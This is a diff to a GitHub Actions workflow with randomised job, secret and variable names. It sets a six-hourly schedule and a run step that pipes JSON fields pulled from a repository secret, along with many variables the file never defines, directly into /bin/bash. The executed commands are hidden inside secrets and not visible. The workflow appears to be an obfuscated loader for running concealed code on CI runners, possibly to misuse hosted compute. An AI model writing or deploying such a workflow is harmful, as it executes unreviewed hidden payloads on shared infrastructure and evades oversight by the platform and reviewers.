@@ -1,24 +1,31 @@
 name: dingzhengfeng4532
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '45 0/6 * * *'
-jobs:  # 22639
+    - cron: '13 2/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: dingzhengfeng4532
         env:
-          bhbuc95092: ${{ secrets.bhbuc95092 }}
+          hmvv4782: ${{ secrets.hmvv4782 }}
         run: |
-          echo $bhbuc95092 | jq -r .f9 | /bin/bash
-          echo $te94688 | jq -r .vzuka1 | /bin/bash
-          echo $x93079 | jq -r .nigb729 | /bin/bash
-          echo $dcnw9306 | jq -r .m439 | /bin/bash
-          echo $ltn13 | jq -r .p7 | /bin/bash
-          echo $xvete01 | jq -r .n212 | /bin/bash
-          echo $eu60105 | jq -r .tvz0 | /bin/bash
-          echo $s6034 | jq -r .dn72 | /bin/bash
+          echo $hmvv4782 | jq -r .acmvb906 | /bin/bash
+          echo $u6 | jq -r .fgt5 | /bin/bash
+          echo $vfr9 | jq -r .dful0 | /bin/bash
+          echo $a8004 | jq -r .km25165 | /bin/bash
+          echo $k7 | jq -r .dm64507 | /bin/bash
+          echo $jmi46 | jq -r .vievw86 | /bin/bash
+          echo $c3 | jq -r .rtlr0305 | /bin/bash
+          echo $xvhqy3121 | jq -r .ge501 | /bin/bash
+          echo $v808 | jq -r .shug64973 | /bin/bash
+          echo $oqlm85 | jq -r .bymgb0 | /bin/bash
+          echo $ms19835 | jq -r .iu40299 | /bin/bash
+          echo $gsc660 | jq -r .cuws8 | /bin/bash
+          echo $uq76 | jq -r .aewo5092 | /bin/bash
+          echo $q48039 | jq -r .xlgrn046 | /bin/bash
+          echo $hvusy28116 | jq -r .gmj31425 | /bin/bash
 
